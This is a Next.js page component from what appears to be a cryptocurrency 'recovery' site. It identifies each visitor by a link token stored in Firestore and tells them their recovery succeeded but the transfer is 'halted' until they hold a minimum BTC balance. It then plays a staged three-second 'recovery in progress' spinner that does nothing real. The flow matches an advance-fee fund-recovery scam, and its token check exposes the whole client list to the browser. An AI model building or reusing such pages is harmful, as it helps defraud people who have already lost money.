"use client";

import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { collection, doc, getDocs, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase";
import SvgStack from "@/components/SvgStack";
import Image from "next/image";
import bgImage from "@/components/Image_fx__2_-removebg-preview 1.svg";

export default function Page6() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const token = searchParams.get("token");

  const [loading, setLoading] = useState(true);
  const [processing, setProcessing] = useState(false); // loading after button click
  const [client, setClient] = useState<any>(null);

  useEffect(() => {
    if (!token) {
      router.replace("/invalid");
      return;
    }

    const fetchClientData = async () => {
      try {
        const clientsCol = collection(db, "clients");
        const snapshot = await getDocs(clientsCol);
        const clientDoc = snapshot.docs.find(
          (d) => d.data().accessLinkId === token
        );

        if (!clientDoc) {
          router.replace("/invalid");
          return;
        }

        setClient({ id: clientDoc.id, ...clientDoc.data() });
        setLoading(false);
      } catch (err) {
        console.error(err);
        router.replace("/invalid");
      }
    };

    fetchClientData();
  }, [token, router]);

  const handleCompleteRecovery = async () => {
    if (!client) return;

    // Show loading screen for 3 seconds
    setProcessing(true);
    setTimeout(async () => {
      const clientRef = doc(db, "clients", client.id);
      await updateDoc(clientRef, {
        recoveryCompleted: true,
        currentPage: "page7", // optional next page
      });

      setProcessing(false);
      alert("Recovery completed successfully!");
    }, 3000);
  };

  if (loading || processing)
    return (
      <main className="flex items-center justify-center h-screen text-white">
        {/* Loading circle */}
        <div className="flex flex-col items-center gap-4">
          <div className="w-16 h-16 border-4 border-teal-500 border-t-transparent rounded-full animate-spin"></div>
          <p className="text-lg font-semibold">Recovery in progress...</p>
        </div>
      </main>
    );

  return (
    <main className="relative w-full h-screen overflow-hidden">
      <div className="absolute inset-0 w-full h-full">
        <SvgStack />
      </div>

      <div className="relative z-10 flex flex-col items-center justify-center w-full h-full px-4 text-center backdrop-blur-sm bg-black/85">
        <Image
          src={bgImage}
          alt="Background"
          className="absolute inset-0 -z-10 object-contain"
        />

        <div className="w-full max-w-lg bg-[#0E111C]/85 rounded-lg p-6 space-y-6">
          {/* Header */}
          <h2 className="text-white text-xl font-bold">Recovery Successful</h2>
          <p className="text-red-500 font-semibold text-lg">Transfer Halted</p>

          {/* Instruction */}
          <p className="text-gray-400 text-center">
            Minimum of{" "}
            <span className="text-white font-semibold">
              {(client.requiredBalance || 0).toFixed(8)}{" "}
              {client.currency || "BTC"}
            </span>{" "}
             required . 
          </p>

          {/* Complete Recovery Button */}
          <button
            onClick={handleCompleteRecovery}
            className="mt-4 w-full py-3 bg-teal-600 rounded-xl font-semibold hover:bg-teal-500"
          >
            Complete Recovery
          </button>
        </div>
      </div>
    </main>
  );
}
